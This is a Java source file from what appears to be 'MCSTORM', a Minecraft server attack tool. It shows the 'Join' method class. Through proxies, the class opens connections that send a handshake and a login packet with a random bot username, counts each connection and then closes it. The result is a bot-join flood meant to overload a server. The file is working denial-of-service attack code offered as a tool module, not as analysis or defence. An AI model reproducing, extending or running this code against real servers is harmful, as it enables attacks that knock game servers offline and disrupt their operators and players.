package io.MCSTORM.methods;


import io.MCSTORM.Main;
import io.MCSTORM.utils.Handshake;
import io.MCSTORM.utils.LoginRequest;
import io.MCSTORM.utils.NettyBootstrap;
import io.MCSTORM.utils.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

import java.security.SecureRandom;
import java.util.Random;


public class Join implements Method {
    private Handshake handshake;
    private byte[] bytes;

    public Join() {
        if (!Main.http) {
            this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
            this.bytes = this.handshake.getWrappedPacket();
        }
    }

    private String randomString(int len) {
        int leftLimit = 97;
        int rightLimit = 122;
        int targetStringLength = len;
        Random random = new Random();
        StringBuilder buffer = new StringBuilder(targetStringLength);
        for (int i = 0; i < targetStringLength; i++) {
            int randomLimitedInt = leftLimit + (int) (random.nextFloat() * (rightLimit - leftLimit + 1));
            buffer.append((char) randomLimitedInt);
        }
        return buffer.toString();
    }

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest("MCSTORM_REBORN_" + (new SecureRandom()).nextInt(99999))).getWrappedPacket()));
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
        channel.close();
    }

}


